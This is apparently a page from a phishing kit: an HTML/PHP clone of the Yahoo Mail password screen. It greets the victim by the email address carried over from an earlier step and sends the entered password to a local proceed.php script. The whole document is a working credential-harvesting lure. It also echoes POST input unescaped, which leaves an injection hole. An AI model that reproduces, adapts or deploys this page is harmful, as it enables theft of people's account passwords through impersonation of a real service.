
<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex">
               <title>Home</title>
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="script/coast.css">
        <!--<![endif]-->
        

        
    </head>
    <body >
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            <p class="mbr-legacy-device">
                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="">More Info</a>
            </p>
        </div>
  

    <div class="loginish  puree-v2">
    <div class="hd mbr-ucs-hd" id="mbr-uh-hd">
    <style type="text/css">@font-face{font-family:uh;src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?);src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?#iefix) format('embedded-opentype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2?) format('woff2'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff?) format('woff'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf?) format('truetype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg?#uh) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}</style><link type="text/css" rel="stylesheet" href="script/coast.css" /><!-- meta --><div id="yucs-meta" ></div><!-- /meta --><div id="UH" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" role="banner" data-protocol='https' data-property="login" data-spaceid="" data-stencil="true"> <style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}</style> <div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" style ="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation"><style>/** * IE7+ and non-retina display */.YLogoMY { background-repeat: no-repeat; background-image: url(https://s.yimg.com/rz/d/yahoo_mail_en-US_s_f_pw_351x40_mail.png); _background-image: url(https://s.yimg.com/rz/d/yahoo_mail_en-US_s_f_pw_351x40_mail.gif); /* IE6 */ width: 350px !important; }.DarkTheme .YLogoMY { background-position: -351px 0px !important;}/** * For 'retina' display */@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(https://s.yimg.com/rz/d/yahoo_mail_en-US_s_f_pw_351x40_mail_2x.png) !important; background-size: 700px 40px !important; }}</style><a class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " data-ylk="slk:logo;t3:logo;t5:logo;elm:img;elmt:logo;" href="#" target="_top" >Yahoo</a></div> <div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">   <li class="yucs-mail-info D(ib) Lts(n) Zoom Va(t) Pos(r) Lh(1.7)"><a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="https://overview.mail.yahoo.com/" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"><b>About Mail</b></a><a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"><b>Features</b></a><a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"><b>Get the App</b></a></li> <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> <a id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"> <b>Help</b> </a></li> </ul> </div> </div><!-- /#UH --></div>   
</div>

        <div class="login-box-container">
            <div class="login-box ">
                <div class="txt-align-center">
                        <img src="images/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo " width="116" height="" />
                </div>
                <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
        <h1 class="username">Hello <?php echo $_POST['e1']; ?></h1>
        <p class="not-you"><a href="#">Not you?</a></p>
    </div>
    <form action="" method="post" action="proceed.php" class="pure-form pure-form-stacked">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="vr6vkdTJovj" />
        <input type="hidden" name="acrumb" value="zvNdHs3j" />
        <input type="hidden" name="sessionIndex" value="QQ--" />
        <input type="hidden" name="displayName" value="<?php echo $_POST['e1']; ?>" />
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="U" value="<?php echo $_POST['e1']; ?>" />
        </div>
        <input type="hidden" name="P" value="normal" />
        <input type="password" id="login-passwd"  name="P1" placeholder="Password" />
        <p class="signin-cont">
            <button type="submit"  class="pure-button puree-button-primary puree-spinner-button" onclick="javascript: form.action='proceed.php'" value="Sign in"  >
                Sign in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link"
                name="skip" value="I forgot my password" />
        </p>
    </form>
</div>

</div>

            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
                <h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>

            </div>
        </div>
        <div class="login-box-ad-outer">
            <div class="login-box-ad-inner">
                <div id="login-ad-mon"></div>
                <div id="login-ad-sky"></div>
                <div id="login-ad-rich"></div>
            </div>
        </div>
</div>


    <div id="mbr-css-check"></div>
</body>
</html>
<!-- fe14.member.bf1.yahoo.com - Wed Nov 22 2017 22:03:26 GMT+0000 (UTC) - (1ms) -->
